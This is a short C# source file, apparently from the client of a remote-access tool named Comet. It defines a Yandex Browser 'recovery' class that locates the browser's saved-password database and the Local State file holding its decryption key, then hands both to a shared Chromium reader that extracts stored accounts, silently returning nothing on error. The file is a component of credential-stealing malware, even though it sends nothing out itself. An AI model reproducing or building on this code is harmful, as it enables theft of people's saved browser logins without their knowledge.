﻿using Comet.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Comet.Client.Recovery.Browsers
{
    public class GetYandex : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Yandex";

        /// <inheritdoc />
        public override IEnumerable<SaveUser> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<SaveUser>();
            }
        }
    }
}
